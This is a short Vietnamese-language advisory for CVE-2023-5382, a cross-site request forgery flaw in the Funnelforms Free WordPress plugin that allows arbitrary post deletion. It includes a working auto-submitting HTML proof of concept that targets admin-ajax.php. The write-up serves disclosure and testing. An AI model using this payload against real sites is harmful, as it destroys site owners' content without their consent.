# CVE-2023-5382

- Plugin : Funnelforms Free
- Phiên bản lỗi : <=3.4
- Lỗi : Cross-Site Request Forgery to Arbitrary Post Deletion
- CVSS Score: 6.5 (MEDIUM)

# Mô tả

- Plugin Funnelforms Free dành cho WordPress dễ bị tấn công bởi Giả mạo yêu cầu trên nhiều trang web ở các phiên bản lên đến và bao gồm cả 3.4. Điều này là do xác thực nonce bị thiếu hoặc không chính xác trên hàm fnsf_delete_posts. Điều này giúp những kẻ tấn công không được xác thực có thể xóa các bài đăng tùy ý thông qua một yêu cầu giả mạo với điều kiện là chúng có thể lừa quản trị viên trang web thực hiện một hành động chẳng hạn như nhấp vào liên kết.

# POC

- PoC (This will delete the form with ID 1)

`<html>

  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://example.com/wordpress/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="af2&#95;fnsf&#95;delete&#95;posts" />
      <input type="hidden" name="post&#95;ids&#91;&#93;" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>`

# Khai Thác
